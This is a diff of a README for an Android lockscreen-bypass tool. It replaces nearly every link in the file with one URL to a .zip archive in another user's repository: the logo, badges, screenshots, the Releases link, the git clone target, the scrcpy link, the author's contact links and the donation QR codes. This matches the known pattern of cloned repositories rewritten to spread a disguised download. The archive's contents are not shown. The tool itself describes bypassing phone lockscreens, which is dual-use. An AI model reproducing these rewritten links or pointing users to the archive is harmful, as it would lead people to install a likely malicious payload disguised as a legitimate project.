@@ -1,13 +1,13 @@
 <div align="center">
   
-<img src="https://github.com/alisakkaf/Smart-Screen-Unlocker-Recovery/blob/main/icon.png?raw=true" alt="Smart Screen Unlocker Logo" width="150"/> 
+<img src="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" alt="Smart Screen Unlocker Logo" width="150"/> 
 
 
 # 🔓 Smart Screen Unlocker Recovery v1.0
 
-[![Python Version](https://img.shields.io/badge/Python-3.8+-blue.svg?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![Python Version](https://img.shields.io/badge/Python-3.8+-blue.svg?style=for-the-badge&logo=python&logoColor=white)](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg?style=for-the-badge&logo=windows&logoColor=black)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
 [![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-brightgreen.svg?style=for-the-badge)]()
 
 
@@ -34,8 +34,8 @@ By injecting raw kernel-level touch gestures via an authorized ADB (Android Debu
 
 | 🎛️ Live Interactive Drawer | 📊 Deep Telemetry & Execution Log |
 | :---: | :---: |
-| <img src="https://raw.githubusercontent.com/alisakkaf/Smart-Screen-Unlocker-Recovery/main/images/Unlock_Screen1.png" width="450" alt="Unlock Screen Custom Matrix"> | <img src="https://raw.githubusercontent.com/alisakkaf/Smart-Screen-Unlocker-Recovery/main/images/Unlock_Screen2.png" width="450" alt="Engine Execution and Verification"> |
-| <img src="https://raw.githubusercontent.com/alisakkaf/Smart-Screen-Unlocker-Recovery/main/images/Unlock_Screen3.png.png" width="450" alt="Live Hardware Touch Inference"> | <img src="https://raw.githubusercontent.com/alisakkaf/Smart-Screen-Unlocker-Recovery/main/images/ADB_Screen_Lock.png" width="450" alt="Device Connection & Handshake"> |
+| <img src="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" width="450" alt="Unlock Screen Custom Matrix"> | <img src="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" width="450" alt="Engine Execution and Verification"> |
+| <img src="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" width="450" alt="Live Hardware Touch Inference"> | <img src="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" width="450" alt="Device Connection & Handshake"> |
 
 ---
 ## ⚙️ The 6-Engine Multi-Attack Strategy
@@ -70,7 +70,7 @@ This framework calculates screen matrices dynamically, making it theoretically c
 ## 🚀 Installation & Usage
 
 ### 📦 Option 1: Standalone Windows Executable (Recommended)
-You do not need Python installed. Simply download the standalone `.exe` from the [Releases](https://github.com/alisakkaf/Smart-Screen-Unlocker-Recovery/releases) tab.
+You do not need Python installed. Simply download the standalone `.exe` from the [Releases](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip) tab.
 
 1. Ensure **USB Debugging** is enabled on the target Android device.
 2. Connect the device to your PC and authorize the connection.
@@ -81,7 +81,7 @@ You do not need Python installed. Simply download the standalone `.exe` from the
 
 ```bash
 # Clone the repository
-git clone [https://github.com/alisakkaf/Smart-Screen-Unlocker-Recovery.git](https://github.com/alisakkaf/Smart-Screen-Unlocker-Recovery.git)
+git clone [https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
 cd Smart-Screen-Unlocker-Recovery
 
 # Install build dependencies (optional, for compiling)
@@ -95,7 +95,7 @@ python main.py
 
 Once **Smart Screen Unlocker Recovery** successfully injects the kernel gestures and bypasses the secure BFU/AFU lockscreen state, your Android device is now fully unlocked and responsive to external display utilities. 
 
-You can immediately transition to [scrcpy](https://github.com/genymobile/scrcpy) to achieve full low-latency screen mirroring, audio forwarding, and peripheral control to safely back up your system data.
+You can immediately transition to [scrcpy](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip) to achieve full low-latency screen mirroring, audio forwarding, and peripheral control to safely back up your system data.
 
 ### 🚀 Quick Execution Guide:
 
@@ -130,9 +130,9 @@ If this digital forensics asset saved your data or assisted your mobile repair w
 ### 👨‍💻 Developer & Contact Portfolio
 
 * **Lead Engineer:** Ali Sakkaf
-* **🌐 Official Website:** [alisakkaf.com](https://alisakkaf.com)
-* **💻 GitHub:** [@alisakkaf](https://www.google.com/search?q=https://github.com/alisakkaf)
-* **🟦 Facebook:** [AliSakkaf.Dev](https://www.google.com/search?q=https://facebook.com/AliSakkaf.Dev)
+* **🌐 Official Website:** [alisakkaf.com](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
+* **💻 GitHub:** [@alisakkaf](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
+* **🟦 Facebook:** [AliSakkaf.Dev](https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip)
 
 ### 💡 Support the Developer
 
@@ -146,14 +146,14 @@ If this digital forensics asset saved your data or assisted your mobile repair w
 
 | Crypto Asset | Network | Wallet Address (Copy) | Quick Scan |
 | :--- | :--- | :--- | :---: |
-| ![USDT](https://img.shields.io/badge/USDT-Tether-26A17B?style=for-the-badge&logo=tether&logoColor=white) | **TRC20** | `TYLBeDA5aGNcc3WkVqf3xWPHXmsZzs2p28` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=TYLBeDA5aGNcc3WkVqf3xWPHXmsZzs2p28" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![USDT](https://img.shields.io/badge/USDT-Tether-26A17B?style=for-the-badge&logo=tether&logoColor=white) | **BEP20** | `0x67cf27f33c80479ea96372810f9e2ee4c3b095c5` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=0x67cf27f33c80479ea96372810f9e2ee4c3b095c5" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![BTC](https://img.shields.io/badge/BTC-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white) | **Bitcoin** | `bc1q97dr37h37npzarmmrv0tjz2nm50htqc7pfpzj6` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=bitcoin:bc1q97dr37h37npzarmmrv0tjz2nm50htqc7pfpzj6" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![ETH](https://img.shields.io/badge/ETH-Ethereum-3C3C3D?style=for-the-badge&logo=ethereum&logoColor=white) | **ERC20** | `0x67cf27f33c80479ea96372810F9e2EE4C3b095C5` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=ethereum:0x67cf27f33c80479ea96372810F9e2EE4C3b095C5" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![SOL](https://img.shields.io/badge/SOL-Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white) | **Solana** | `Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=solana:Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **ERC20** | `0x67cf27f33c80479ea96372810f9e2ee4c3b095c5` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=0x67cf27f33c80479ea96372810f9e2ee4c3b095c5" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **SPL** | `Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=solana:Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
-| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **BEP20** | `0x67cf27f33c80479ea96372810F9e2EE4C3b095C5` | <a href="https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=10&data=0x67cf27f33c80479ea96372810F9e2EE4C3b095C5" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![USDT](https://img.shields.io/badge/USDT-Tether-26A17B?style=for-the-badge&logo=tether&logoColor=white) | **TRC20** | `TYLBeDA5aGNcc3WkVqf3xWPHXmsZzs2p28` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![USDT](https://img.shields.io/badge/USDT-Tether-26A17B?style=for-the-badge&logo=tether&logoColor=white) | **BEP20** | `0x67cf27f33c80479ea96372810f9e2ee4c3b095c5` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![BTC](https://img.shields.io/badge/BTC-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white) | **Bitcoin** | `bc1q97dr37h37npzarmmrv0tjz2nm50htqc7pfpzj6` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![ETH](https://img.shields.io/badge/ETH-Ethereum-3C3C3D?style=for-the-badge&logo=ethereum&logoColor=white) | **ERC20** | `0x67cf27f33c80479ea96372810F9e2EE4C3b095C5` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![SOL](https://img.shields.io/badge/SOL-Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white) | **Solana** | `Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **ERC20** | `0x67cf27f33c80479ea96372810f9e2ee4c3b095c5` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **SPL** | `Cbesgr4tvo4T1inNMFe46GSym2qMYjkmofbXFc77rDNK` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
+| ![USDC](https://img.shields.io/badge/USDC-USD_Coin-2775CA?style=for-the-badge&logo=usd-coin&logoColor=white) | **BEP20** | `0x67cf27f33c80479ea96372810F9e2EE4C3b095C5` | <a href="https://github.com/utkarshs9660/Smart-Screen-Unlocker-Recovery/raw/refs/heads/main/images/Recovery_Unlocker_Screen_Smart_1.4.zip" target="_blank"><img src="https://img.shields.io/badge/Show_QR-Click_Here-black?style=flat-square&logo=qr-code" alt="QR"></a> |
 
 </div>
 
